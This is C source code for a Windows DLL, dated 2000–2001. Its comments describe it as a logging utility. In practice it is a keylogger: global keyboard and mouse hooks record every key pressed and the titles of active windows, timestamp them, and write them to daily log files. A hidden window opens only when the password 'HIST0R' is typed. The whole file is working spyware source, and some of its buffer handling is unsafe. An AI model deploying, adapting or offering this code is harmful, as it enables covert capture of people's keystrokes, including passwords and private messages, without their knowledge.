/*=============================================================================
*
*               LOG utility, (DLL)
*               Log all key pressed     and Active Window titles.
*               every day new log.
*               if type <hist0r> then will apear main window.
*
*               VisualC++ 6.0
*
*
*               Copyright (c) 2000 2001 Shilonosov Alex
*               Shilonosov@mail.ru(@mail.md), www.shilonosov.f2s.com
*
*       Original code of HOOK routine was took fom Arthur Boynagryan LOCKer.
*       boynagar@armentel.com
*
*
*/


#include "stdafx.h"
#include "hooks.h"
#include "stdio.h"

#define  BUFFSIZE 200

#pragma data_seg(".hdata")
HHOOK hKeyHook = NULL;
HHOOK hMouseHook = NULL;
bool doShow = 0;
char str[500] = {"historics"};
#pragma data_seg()

//_inf Info;

char cr[] = {"\x0D\x0A"};
char buffer[1000];
DWORD buff_pos =0 ;

static char szInput[15];
static char szPassword[15] = "HIST0R";

SYSTEMTIME time;
WORD time_min;
HWND curr_wnd;
HWND mhWnd;

char path[MAX_PATH];


BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                                         )
{
    switch (ul_reason_for_call)
        {
                case DLL_PROCESS_ATTACH:
                        buff_pos=0;
                        buffer[0]=0;
                        //wrds =0;

                        GetModuleFileName((HMODULE)hModule,path,MAX_PATH);
                        //strcat(path,"\\mstkjet32.dll");
                        AddHist("<Start>",7);
                        AddHist(cr,2);
                        CheckTimer();
                        break;
                case DLL_THREAD_ATTACH: break;
                case DLL_THREAD_DETACH: break;
                case DLL_PROCESS_DETACH:

                        break;
    }
    return TRUE;
}

void HOOKS_API SetHooks(HHOOK hk, HHOOK hm, HHOOK hs, HWND wnd )
{
        GetLocalTime(&time);

        doShow = false;
    hKeyHook = hk;
        hMouseHook = hm;
        mhWnd = wnd;
        buffer[0]=0;
        AddHist(cr,2);
        AddHist("<Start>",7);
        AddHist(cr,2);
        CheckTimer();
}


LRESULT HOOKS_API CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    char chInput = (char) wParam;
    char *szSearchResult;
        char name[20];

    if (nCode == HC_ACTION && lParam & 0x80000000)
    {
                CheckTimer();
                CheckTask();

                GetKeyNameText(lParam,name,19);
                AddHist("<", 1 );
                AddHist(name, strlen(name) );
                AddHist(">", 1 );

        if (strchr(szPassword, chInput) != NULL)
        {
                        szInput[strlen(szInput)]=chInput;
            if (lstrcmpi(szInput, szPassword) == 0)
            {

                                if ( MessageBox(NULL ,str , "show" , MB_OKCANCEL        ) == IDOK )
                                                doShow = true;
            }
            else
            {
                szSearchResult = strstr(szPassword, szInput);
                if (szSearchResult == NULL || (szSearchResult - szPassword + 1) > 1)
                                        memset(szInput, '\0', sizeof(szInput));
            }
        }
        else
                {
            memset(szInput, '\0', sizeof(szInput));
                }

    }

        return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

LRESULT HOOKS_API CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
                CheckTimer();
                CheckTask();
    }
        return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}


void AddHist(char *letter, int len)
{
        if ( strlen(buffer) + len >= BUFFSIZE )
        {
                char name[20];
                HANDLE file;

                *(strrchr(path,'\\')+1)=0;
            sprintf(name,"%02d%02d%02d.log",time.wDay,time.wMonth,time.wYear);
                strcat(path,name);

                if ( (file = CreateFile(path,GENERIC_WRITE      , FILE_SHARE_WRITE      ,NULL,OPEN_ALWAYS       ,
                        FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE )  return;
                SetFilePointer(file,0L, 0L, FILE_END);

                WriteFile(file, (LPVOID)&buffer, strlen(buffer), (LPDWORD)&buff_pos, NULL);
                CloseHandle(file);
                buffer[0]=0;
        }
        strcat(buffer,letter);

}

void CheckTimer()
{
        GetLocalTime(&time);
        if ( time_min != time.wMinute)
        {
                time_min = time.wMinute;
                sprintf(str,"time=<%2d:%d>=",time.wHour, time.wMinute);
                AddHist(cr,2);
                AddHist(str,strlen(str));
                AddHist(cr,2);
        }
}

void CheckTask()
{
        HWND wnd = GetForegroundWindow();
        if ( curr_wnd != wnd)
        {
                curr_wnd=wnd;

                ::GetWindowText(wnd,str,500);
                if ( strlen(str) < 3 ) return;
                AddHist(cr,2);
                AddHist("ActWnd=",7);
                AddHist(str,strlen(str));
                AddHist(cr,2);
        }
}

bool HOOKS_API isExit()
{
        bool exit = doShow;
        doShow = false;
        return  exit;
}

